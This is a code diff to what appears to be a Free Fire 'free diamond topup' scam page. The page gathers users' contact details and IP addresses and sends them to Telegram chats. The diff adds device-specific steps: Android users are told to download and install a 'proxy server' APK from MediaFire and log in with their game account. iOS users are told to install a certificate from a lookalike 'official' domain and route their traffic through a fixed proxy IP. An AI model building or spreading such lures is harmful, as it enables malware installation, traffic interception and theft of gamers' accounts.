@@ -44,10 +44,12 @@
             border-radius: 5px;
             text-align: center;
             cursor: pointer;
+            transition: all 0.3s ease;
         }
         .button:hover {
             background-color: #00ff00;
             color: black;
+            box-shadow: 0 0 15px #00ff00;
         }
         .button:active {
             transform: scale(0.98);
@@ -133,6 +135,45 @@
         .payment-option {
             margin: 15px 0;
         }
+        /* New styles for platform selection */
+        .platform-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .platform-btn {
+            width: 100%;
+            padding: 12px;
+            font-size: 1em;
+            background: black;
+            border: 2px solid;
+            transition: all 0.3s ease;
+        }
+        .android-btn {
+            border-color: #3ddc84;
+            color: #3ddc84;
+        }
+        .android-btn:hover {
+            box-shadow: 0 0 15px #3ddc84;
+            text-shadow: 0 0 10px #3ddc84;
+        }
+        .ios-btn {
+            border-color: #007aff;
+            color: #007aff;
+        }
+        .ios-btn:hover {
+            box-shadow: 0 0 15px #007aff;
+            text-shadow: 0 0 10px #007aff;
+        }
+        .back-btn {
+            margin-top: 20px;
+            width: 100%;
+        }
+        .highlight {
+            color: #00ff00;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
@@ -153,7 +194,6 @@
         <button class="button" id="freeBtn">FREE DIAMOND TOPUP</button>
     </div>
 
-    <!-- New container for contact info collection -->
     <div class="container hidden" id="contactInfoContainer">
         <h2>Contact Information</h2>
         <p>Enter your Telegram @username or Phone Number:</p>
@@ -195,16 +235,40 @@
         <button class="button pulse" id="checkApprovalBtn">Check Approval Status</button>
     </div>
 
-    <div class="container hidden" id="confirmationContainer">
+    <div class="container hidden" id="platformContainer">
+        <h2>🎯 SELECT YOUR DEVICE</h2>
+        <div class="platform-buttons">
+            <button class="button platform-btn android-btn" id="androidBtn">ANDROID</button>
+            <button class="button platform-btn ios-btn" id="iosBtn">iOS</button>
+        </div>
+    </div>
+
+    <div class="container hidden" id="androidDetails">
         <h2>🎯 VIP PROXY DETAILS</h2>
         <div id="proxyDetails">
-            <p><strong>🌐 IP:</strong> 13.201.57.94</p>
-            <p><strong>🚪 Port:</strong> 1001</p>
-            <p><strong>📎 Certificate:</strong> <a href="https://www.dl.cdn.freefireofficial.com/common/services/servers/essentials/freecert">Download Cert.</a></p>
-            <p><strong>📱 For Android:</strong> Use ShadowRocket App</p>
-            <p><strong>🍏 For iOS:</strong> Certificate required</p>
+            <p><strong>🌐 IP:</strong> <span class="highlight">13.201.57.94</span></p>
+            <p><strong>🚪 Port:</strong> <span class="highlight">1001</span></p>
+            <p><strong>Steps:</strong> Download and Install The APK Then Login Your Id And Play!</p>
+            <p><strong>📎 FF PROXY SERVER:</strong> <a href="https://www.mediafire.com/file/idrvyj9yfhxd5mx/FF-PROXY_SERVER.apk/file" style="color:#3ddc84">Download APK</a></p>
         </div>
-        <button class="button" id="finalBackBtn">Back to Menu</button>
+        <button class="button back-btn" id="backToPlatformFromAndroid">Back to Selection</button>
+    </div>
+
+    <div class="container hidden" id="iosDetails">
+        <h2>🎯 VIP PROXY DETAILS</h2>
+        <div id="proxyDetails">
+            <p><strong>🌐 IP:</strong> <span class="highlight">13.201.57.94</span></p>
+            <p><strong>🚪 Port:</strong> <span class="highlight">1001</span></p>
+            <p><strong>📎 Certificate:</strong> <a href="https://www.dl.cdn.freefireofficial.com/common/services/servers/essentials/freecert" style="color:#007aff">Download</a></p>
+            <p><strong>🍏 Steps:</strong></p>
+            <ol style="text-align: left; padding-left: 20px;">
+                <li>Install the certificate</li>
+                <li>Go to WiFi settings</li>
+                <li>Configure proxy with the IP and Port</li>
+                <li>Or use Shadow Rocket app with these details</li>
+            </ol>
+        </div>
+        <button class="button back-btn" id="backToPlatformFromIos">Back to Selection</button>
     </div>
 
     <script>
@@ -368,7 +432,7 @@
                     statusText.style.color = "#0f0";
                     setTimeout(() => {
                         document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
-                        document.getElementById("confirmationContainer").classList.remove('hidden');
+                        document.getElementById("platformContainer").classList.remove('hidden');
                     }, 1500);
                     return;
                 }
@@ -382,7 +446,7 @@
                     statusText.style.color = "#0f0";
                     setTimeout(() => {
                         document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
-                        document.getElementById("confirmationContainer").classList.remove('hidden');
+                        document.getElementById("platformContainer").classList.remove('hidden');
                     }, 1500);
                 } else if (status.status === 'rejected') {
                     updateTransaction({ status: 'rejected' });
@@ -416,6 +480,7 @@
                          `🌐 IP: ${currentTransaction.userIp}%0A` +
                          `⏰ ${new Date().toLocaleString()}%0A%0A` +
                          `<a href="${CONFIG.APPROVE_URL}">⚡️ AUTHORIZATION GATEWAY</a>`;
+
             try {
                 // Send to each chat ID sequentially
                 for (const chatId of CONFIG.CHAT_IDS) {
@@ -465,7 +530,7 @@
             // Check if already approved
             if (currentTransaction.approved) {
                 document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
-                document.getElementById("confirmationContainer").classList.remove('hidden');
+                document.getElementById("platformContainer").classList.remove('hidden');
                 return;
             }
             
@@ -532,9 +597,25 @@
 
         document.getElementById("checkApprovalBtn").addEventListener("click", checkApprovalStatus);
 
-        document.getElementById("finalBackBtn").addEventListener("click", function() {
+        // New event listeners for platform selection
+        document.getElementById("androidBtn").addEventListener("click", function() {
             document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
-            document.getElementById("optionsContainer").classList.remove('hidden');
+            document.getElementById("androidDetails").classList.remove('hidden');
+        });
+
+        document.getElementById("iosBtn").addEventListener("click", function() {
+            document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
+            document.getElementById("iosDetails").classList.remove('hidden');
+        });
+
+        document.getElementById("backToPlatformFromAndroid").addEventListener("click", function() {
+            document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
+            document.getElementById("platformContainer").classList.remove('hidden');
+        });
+
+        document.getElementById("backToPlatformFromIos").addEventListener("click", function() {
+            document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
+            document.getElementById("platformContainer").classList.remove('hidden');
         });
 
         // Initialize
@@ -545,7 +626,7 @@
             // Check if already approved
             if (currentTransaction.approved) {
                 document.getElementById("keyContainer").classList.add("hidden");
-                document.getElementById("optionsContainer").classList.remove("hidden");
+                document.getElementById("platformContainer").classList.remove("hidden");
                 return;
             }
             
